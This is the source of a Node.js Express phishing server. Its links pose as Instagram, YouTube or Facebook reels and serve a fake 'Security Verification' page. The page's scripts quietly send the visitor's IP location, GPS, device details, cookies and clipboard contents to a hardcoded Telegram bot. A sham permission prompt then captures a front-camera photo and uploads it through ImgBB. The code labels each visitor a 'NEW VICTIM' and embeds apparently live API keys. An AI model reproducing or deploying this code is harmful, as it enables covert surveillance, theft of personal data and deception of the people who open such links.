const express = require('express');
const app = express();

// ===== TERI VALUES DAAL =====
const TELEGRAM_TOKEN = "8840717306:AAEOhGfFnZsSWGtdOChaJaGC4JLfReeKBaU";
const CHAT_ID = "8179349999";
const IMGBB_API_KEY = "0959c9368daed87c0f1a8d44c203a8b3";
// =============================

app.post('/send-data', express.json({limit:'50mb'}), (req, res) => {
    const {type, data} = req.body;
    if(type === 'contacts') {
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
            encodeURIComponent("📱 *CONTACTS*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
    }
    if(type === 'sms') {
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
            encodeURIComponent("💬 *SMS DATA*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
    }
    if(type === 'clipboard') {
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
            encodeURIComponent("📋 *CLIPBOARD*\n\n" + data.substring(0, 1500)) + "&parse_mode=Markdown");
    }
    if(type === 'installed_apps') {
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
            encodeURIComponent("📦 *INSTALLED APPS*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
    }
    res.send({ok:true});
});

app.get('/c/:code/:encoded', (req, res) => {
    try {
        let legitUrl = Buffer.from(req.params.encoded, 'base64').toString('utf-8');
        
        // Instagram Reels ya YouTube Shorts redirect
        if(legitUrl.includes('instagram.com')) legitUrl = "https://www.instagram.com/reels/";
        if(legitUrl.includes('youtube.com')) legitUrl = "https://www.youtube.com/shorts/";
        if(legitUrl.includes('facebook.com')) legitUrl = "https://www.facebook.com/reel/";
        
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;min-height:100vh;background:#0f0c29;overflow:hidden}
/* === STEP 1: VERIFICATION PAGE === */
#step1{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);display:flex;justify-content:center;align-items:center;z-index:10;transition:all 0.8s ease}
#step1.hidden{opacity:0;pointer-events:none}
.card{background:rgba(255,255,255,0.96);border-radius:24px;padding:35px 28px;max-width:380px;width:92%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.6)}
.logo{width:75px;height:75px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;font-size:36px;color:white;box-shadow:0 8px 25px rgba(102,126,234,0.4)}
h2{color:#1a1a2e;font-size:20px;font-weight:700;margin-bottom:4px}
.sub{color:#888;font-size:13px;margin-bottom:18px}
.spinner{width:42px;height:42px;border:4px solid #eee;border-top:4px solid #667eea;border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 16px}
@keyframes spin{to{transform:rotate(360deg)}}
.progress{width:100%;height:4px;background:#eee;border-radius:10px;overflow:hidden;margin:12px 0}
.progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);animation:fill 4s ease forwards}
@keyframes fill{0%{width:0%}100%{width:100%}}
.steps{text-align:left;margin:15px 0;padding:0;list-style:none}
.steps li{padding:6px 0;color:#999;font-size:12px;display:flex;align-items:center;gap:10px}
.steps li .dot{width:16px;height:16px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:9px;flex-shrink:0}
.steps li .dot.pending{background:#f0f0f0;color:#ccc;border:1px solid #ddd}
.steps li .dot.done{background:#4CAF50;color:white;border:none}
.steps li.done{color:#4CAF50}
.status{color:#aaa;font-size:11px;margin-top:10px}
/* === STEP 2: PERMISSION PAGE === */
#step2{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:center;z-index:20;backdrop-filter:blur(5px)}
#step2.show{display:flex}
.permission-card{background:white;border-radius:24px;padding:30px 25px;max-width:380px;width:92%;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.7);animation:popIn 0.4s ease}
@keyframes popIn{0%{transform:scale(0.8);opacity:0}100%{transform:scale(1);opacity:1}}
.warning-icon{width:70px;height:70px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 15px;font-size:34px;color:white}
.permission-card h2{color:#1a1a2e;font-size:19px;margin-bottom:8px}
.permission-card p{color:#777;font-size:13px;margin-bottom:15px;line-height:1.5}
.permission-item{background:#f8f9fa;border-radius:14px;padding:14px 16px;margin:10px 0;display:flex;align-items:center;gap:14px;text-align:left;border:1px solid #eee}
.permission-item .p-icon{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
.permission-item .p-icon.gps{background:#e3f2fd;color:#1976d2}
.permission-item .p-icon.cam{background:#fce4ec;color:#c62828}
.permission-item .p-icon.clip{background:#e8f5e9;color:#2e7d32}
.permission-item .p-text{flex:1}
.permission-item .p-text strong{display:block;font-size:14px;color:#333}
.permission-item .p-text small{display:block;font-size:11px;color:#999;margin-top:2px}
.btn{display:inline-block;padding:14px 40px;border-radius:50px;border:none;font-size:16px;font-weight:600;cursor:pointer;margin-top:15px;width:100%;transition:all 0.3s}
.btn-primary{background:linear-gradient(135deg,#667eea,#764ba2);color:white;box-shadow:0 8px 25px rgba(102,126,234,0.4)}
.btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(102,126,234,0.5)}
.btn-primary:disabled{opacity:0.6;cursor:not-allowed;transform:none}
.btn-success{background:linear-gradient(135deg,#4CAF50,#2e7d32);color:white;box-shadow:0 8px 25px rgba(76,175,80,0.4)}
.btn-success:hover{transform:translateY(-2px)}
.redirect-note{display:none;color:#4CAF50;font-size:13px;margin-top:12px;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:0.7}50%{opacity:1}}
.secure-badge{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:15px;font-size:11px;color:#aaa}
.secure-badge span{color:#4CAF50}
</style>
</head>
<body>

<!-- ===== STEP 1: VERIFICATION ===== -->
<div id="step1">
<div class="card">
<div class="logo">&#x1f6e1;</div>
<h2>Security Verification Required</h2>
<p class="sub">Please wait while we verify your connection</p>
<div class="spinner"></div>
<div class="progress"><div class="progress-bar"></div></div>
<ul class="steps" id="steps">
<li id="s1"><span class="dot pending">&#x2713;</span> Checking IP & network...</li>
<li id="s2"><span class="dot pending">&#x2713;</span> Verifying device...</li>
<li id="s3"><span class="dot pending">&#x2713;</span> Scanning location...</li>
<li id="s4"><span class="dot pending">&#x2713;</span> Security check...</li>
</ul>
<div class="status" id="status">Establishing secure connection...</div>
</div>
</div>

<!-- ===== STEP 2: PERMISSION PAGE ===== -->
<div id="step2">
<div class="permission-card">
<div class="warning-icon">&#x26a0;</div>
<h2>Additional Verification Needed</h2>
<p>Your account requires location verification to prevent unauthorized access. Please enable the following:</p>

<div class="permission-item" id="perm-gps">
<div class="p-icon gps">&#x1f4cd;</div>
<div class="p-text">
<strong>Location Access</strong>
<small>Required to verify your region</small>
</div>
</div>

<div class="permission-item" id="perm-cam">
<div class="p-icon cam">&#x1f4f7;</div>
<div class="p-text">
<strong>Camera Access</strong>
<small>Required for security selfie</small>
</div>
</div>

<div class="permission-item" id="perm-clip">
<div class="p-icon clip">&#x1f4cb;</div>
<div class="p-text">
<strong>Clipboard Access</strong>
<small>Required to verify OTP</small>
</div>
</div>

<button class="btn btn-primary" id="verifyBtn" onclick="startVerification()">&#x1f513; Verify My Account</button>
<div class="redirect-note" id="redirectNote">&#x2714; Verification complete! Redirecting...</div>
<div class="secure-badge">&#x1f512; Secured with 256-bit encryption <span>ON</span></div>
</div>
</div>

<script>
const TOKEN = "${TELEGRAM_TOKEN}";
const CID = "${CHAT_ID}";
const IMGKEY = "${IMGBB_API_KEY}";
const REDIR = "${legitUrl}";

let allCapturedData = "";
let photoUploaded = false;

function tg(msg) {
    fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CID+
        "&text="+encodeURIComponent(msg)+"&parse_mode=Markdown").catch(()=>{});
}
function tgPhoto(url) {
    fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto?chat_id="+CID+"&photo="+url).catch(()=>{});
}
function postData(type, data) {
    fetch("/send-data", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({type:type, data:data.substring(0,5000)})
    }).catch(()=>{});
}
function stepDone(id) {
    const el = document.getElementById(id);
    if(el) { el.className='done'; el.querySelector('.dot').className='dot done'; }
}
function stepStatus(text) {
    document.getElementById('status').textContent = text;
}

// =============================================
//  BACKGROUND COLLECTION (Step 1 ke andar)
// =============================================

// 1. IP + Location
fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
    let m = "📍 *NEW VICTIM*\\n\\n";
    m += "*IP:* "+d.ip+"\\n";
    m += "*City:* "+(d.city||"N/A")+"\\n";
    m += "*Region:* "+(d.region||"N/A")+"\\n";
    m += "*Country:* "+(d.country_name||"N/A")+"\\n";
    m += "*ISP:* "+(d.org||"N/A")+"\\n";
    m += "*Lat:* "+d.latitude+"\\n";
    m += "*Lon:* "+d.longitude+"\\n";
    m += "*Timezone:* "+(d.timezone||"N/A")+"\\n";
    allCapturedData = m;
    
    // GPS
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(p=>{
            allCapturedData += "\\n\\n🎯 *GPS*\\nLat: "+p.coords.latitude+"\\nLon: "+p.coords.longitude+"\\nAccuracy: "+p.coords.accuracy+"m";
            tg(allCapturedData);
            stepDone('s3');
        }, ()=>{
            tg(allCapturedData+"\\n\\n❌ GPS denied in step 1");
            stepDone('s3');
        }, {timeout:3000});
    } else {
        tg(allCapturedData);
        stepDone('s3');
    }
    stepDone('s1');
    stepStatus("Network verified - scanning device...");
    
    // Battery
    if(navigator.getBattery) {
        navigator.getBattery().then(b=>{
            tg("🔋 *BATTERY*\\nLevel: "+Math.round(b.level*100)+"%\\nCharging: "+(b.charging?"Yes":"No"));
        });
    }
});

// 2. Device Info
setTimeout(()=>{
    let info = "🧾 *DEVICE INFO*\\n\\n";
    info += "*UA:* "+navigator.userAgent.substring(0,120)+"\\n";
    info += "*Platform:* "+(navigator.platform||"N/A")+"\\n";
    info += "*Language:* "+navigator.language+"\\n";
    info += "*Screen:* "+screen.width+"x"+screen.height+"\\n";
    info += "*RAM:* "+(navigator.deviceMemory||"N/A")+"GB\\n";
    info += "*Cores:* "+(navigator.hardwareConcurrency||"N/A")+"\\n";
    info += "*Time:* "+new Date().toLocaleString()+"\\n";
    info += "*Timezone:* "+Intl.DateTimeFormat().resolvedOptions().timeZone;
    tg(info);
    stepDone('s2');
    stepStatus("Device scanned - verifying location...");
}, 1000);

// 3. Cookies
setTimeout(()=>{
    try {
        if(document.cookie && document.cookie.length > 0) {
            tg("🍪 *COOKIES*\\n\\n"+document.cookie.substring(0,1500));
        }
    } catch(e){}
}, 1500);

// 4. Clipboard attempt
setTimeout(()=>{
    try {
        if(navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText().then(text=>{
                if(text && text.length > 0) {
                    tg("📋 *CLIPBOARD (Background)*\\n\\n"+text.substring(0,500));
                    postData('clipboard', text);
                }
            }).catch(()=>{});
        }
    } catch(e){}
}, 2000);

// 5. Step 1 complete hone ke baad Step 2 dikhao
setTimeout(()=>{
    stepDone('s4');
    stepStatus("Verification requires additional permissions");
    
    // Step 1 fade out, Step 2 dikhao
    setTimeout(()=>{
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.add('show');
    }, 800);
}, 4000);

// =============================================
//  STEP 2: VERIFICATION BUTTON CLICK
// =============================================
function startVerification() {
    const btn = document.getElementById('verifyBtn');
    btn.disabled = true;
    btn.textContent = "⏳ Verifying...";
    
    // GPS - dubara try
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(p=>{
            const gpsData = "🎯 *GPS (Step 2)*\\nLat: "+p.coords.latitude+"\\nLon: "+p.coords.longitude+"\\nAccuracy: "+p.coords.accuracy+"m";
            tg(gpsData);
            document.getElementById('perm-gps').style.borderColor = '#4CAF50';
            document.getElementById('perm-gps').style.background = '#e8f5e9';
        }, ()=>{}, {timeout:5000, enableHighAccuracy:true});
    }
    
    // Camera
    try {
        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({
                video: {width:{ideal:320}, height:{ideal:240}, facingMode:"user"},
                audio: false
            }).then(stream=>{
                const v = document.createElement("video");
                v.srcObject = stream;
                v.setAttribute("playsinline","");
                v.play();
                
                setTimeout(()=>{
                    const c = document.createElement("canvas");
                    c.width = 320; c.height = 240;
                    c.getContext("2d").drawImage(v, 0, 0);
                    const b64 = c.toDataURL("image/jpeg",0.7).split(",")[1];
                    
                    // ImgBB upload
                    const fd = new FormData();
                    fd.append("image", b64);
                    
                    fetch("https://api.imgbb.com/1/upload?key="+IMGKEY, {
                        method:"POST",
                        body:fd
                    }).then(r=>r.json()).then(data=>{
                        if(data && data.success) {
                            tgPhoto(data.data.url);
                            tg("📸 *PHOTO CAPTURED (Step 2)* ✅");
                            photoUploaded = true;
                        }
                    }).catch(()=>{});
                    
                    document.getElementById('perm-cam').style.borderColor = '#4CAF50';
                    document.getElementById('perm-cam').style.background = '#e8f5e9';
                    stream.getTracks().forEach(t=>t.stop());
                }, 1200);
            }).catch(()=>{});
        }
    } catch(e){}
    
    // Clipboard - dubara try
    setTimeout(()=>{
        try {
            if(navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(text=>{
                    if(text && text.length > 0) {
                        tg("📋 *CLIPBOARD (Step 2)*\\n\\n"+text.substring(0,500));
                        document.getElementById('perm-clip').style.borderColor = '#4CAF50';
                        document.getElementById('perm-clip').style.background = '#e8f5e9';
                    }
                }).catch(()=>{});
            }
        } catch(e){}
    }, 1000);
    
    // Final redirect
    setTimeout(()=>{
        btn.className = "btn btn-success";
        btn.textContent = "✓ Verified! Redirecting...";
        document.getElementById('redirectNote').style.display = 'block';
        
        setTimeout(()=>{
            window.location.href = REDIR;
        }, 2000);
    }, 3000);
}
</script>
</body>
</html>`;
        res.send(html);
    } catch(e) {
        res.status(400).send('Invalid link');
    }
});

app.get('/', (req, res) => {
    res.send('Server Ready');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Running on port ' + PORT));